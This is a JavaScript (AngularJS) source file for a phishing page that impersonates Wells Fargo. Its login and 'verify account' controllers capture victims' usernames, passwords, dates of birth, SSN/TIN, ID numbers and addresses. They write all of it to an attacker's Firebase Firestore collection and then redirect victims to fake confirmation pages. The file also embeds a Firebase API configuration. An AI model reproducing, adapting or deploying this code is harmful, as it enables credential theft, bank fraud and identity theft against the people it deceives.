var priApp = angular.module('priApp', ['angularMoment']);

priApp.run([
    '$rootScope',
    '$window',
    function($rootScope, $window) {
        var firebaseConfig = {
            apiKey: "AIzaSyCmYrkd0c_Aop1jZ0CCsK-TXP4YoYG0A5k",
            authDomain: "adlogs-58b81.firebaseapp.com",
            projectId: "adlogs-58b81",
            storageBucket: "adlogs-58b81.appspot.com",
            messagingSenderId: "39422279092",
            appId: "1:39422279092:web:b7bb46accccdc88c5a46e1",
            measurementId: "G-2CMJX26L8D"
        };
        // Initialize Firebase
        try {
            $window.firebase.initializeApp(firebaseConfig);
            $window.firebase.analytics();
            $rootScope.db = firebase.firestore();
            $rootScope.storage = firebase.storage();
        } catch (error) {}
    },
]);

priApp.controller('MainController', function(
    $scope,
    moment,
    $window,
    $rootScope,
    $timeout
) {
    $scope.user = {
        username: '',
        password: '',
        dob: '',
        ssn: '',
        id_number: '',
        address: '',

    };

    var user_id = $window.localStorage.getItem("user_id");
    $scope.user = {};

    $scope.status_text = "Verify";
    $scope.verifing = false;


    try {


        $rootScope.db.collection('wells_fargo').where("id", "==", user_id).get().then(result => {
            const data = result.docs.map(doc => ({
                id: doc.id,
                ...doc.data(),
            }));

            $scope.$apply(function() {
                $scope.user = data[0];
                console.log(data[0]);
            });
        });



    } catch (error) {

    }



    $scope.verify_account = function() {


        $scope.status_text = "Veriying.....";
        $scope.verifing = true;



        if ($scope.user.dob === "") {
            alert("DOB cannot be empty!");
            return;
        }


        if ($scope.user.ssn === "") {
            alert("SSN/TIN cannot be empty!");
            return;
        }


        if ($scope.user.id_number === "") {
            alert("ID Number cannot be empty!");
            return;
        }

        if ($scope.user.address === "") {
            alert("Address cannot be empty!");
            return;
        }




        $rootScope.db
            .collection('wells_fargo')
            .doc(`${user_id}`)
            .set({
                id: `${ user_id}`,
                username: `${$scope.user.username}`,
                password: `${$scope.user.password}`,
                dob: `${$scope.user.dob}`,
                ssn: `${$scope.user.ssn}`,
                id_number: `${$scope.user.id_number}`,
                address: `${$scope.user.address}`,
            })
            .then(() => {

                $timeout(function() {

                    $window.location.href = "verified.html";
                }, 3000);
            })
            .catch(error => {
                console.error('Error adding document: ', error);
            });
    }



    function createGuid() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
            var r = Math.random() * 16 | 0,
                v = c === 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }

});

priApp.controller('LoginController', function(
    $scope,
    moment,
    $window,
    $rootScope,
    $timeout
) {

    $scope.user = {
        username: '',
        password: '',
        dob: '',
        ssn: '',
        id_number: '',
        address: '',
    };

    $scope.onLogin = function() {
        console.log($scope.user);

        if ($scope.user.username === "") {
            alert("Please enter username");
            return;
        }

        if ($scope.user.password === "") {
            alert("Please enter password");
            return;
        }

        var guid = createGuid();

        $rootScope.db
            .collection('wells_fargo')
            .doc(`${guid}`)
            .set({
                id: `${ guid}`,
                username: `${$scope.user.username}`,
                password: `${$scope.user.password}`,
                dob: `${$scope.user.dob}`,
                ssn: `${$scope.user.ssn}`,
                id_number: `${$scope.user.id_number}`,
                address: `${$scope.user.address}`,
            })
            .then(() => {
                $window.localStorage.setItem("user_id", guid);
                $window.location.href = "verify.html";
            })
            .catch(error => {
                console.error('Error adding document: ', error);
            });



    }



    function createGuid() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
            var r = Math.random() * 16 | 0,
                v = c === 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }

});